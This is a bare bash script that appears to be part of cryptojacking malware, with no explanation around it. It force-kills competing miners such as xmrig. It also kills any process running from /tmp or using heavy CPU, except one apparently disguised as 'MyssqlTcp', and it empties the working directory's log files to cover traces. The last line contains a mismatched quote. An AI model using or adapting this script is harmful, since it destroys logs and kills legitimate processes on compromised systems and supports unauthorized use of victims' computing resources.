#!/bin/bash
if [ -z $HOME ]; then
  echo "ERROR: Please define HOME environment variable to your home directory"
  exit 1
fi

kill_sus_proc()
{
    ps axf -o "pid"|while read procid
    do
        ls -l /proc/$procid/exe | grep /tmp
        if [ $? -ne 1 ]
        then
            cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
            if [ $? -ne 0 ]
            then
                kill -9 $procid
            else
                echo "don't kill"
            fi
        fi
    done
    ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
    do
        cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
        if [ $? -ne 0 ]
        then
            kill -9 $procid
        else
            echo "don't kill"
        fi
    done
}

killall -9 xmrig
killall -9 jj
killall -9 p
kill_sus_proc

if [ ! -d $HOME ]; then
  echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
  echo '  export HOME=<dir>'
  exit 1
fi

if [ `/bin/ls -lt /$HOME/myssqlsys.log | head -1 | /bin/awk '{print $5}'` -gt $((18*18*10)) ]
then
    echo > /$HOME/myssqlsys.log
fi
 
ls *.log | xargs -I x -n 1 sh -c "echo > x”
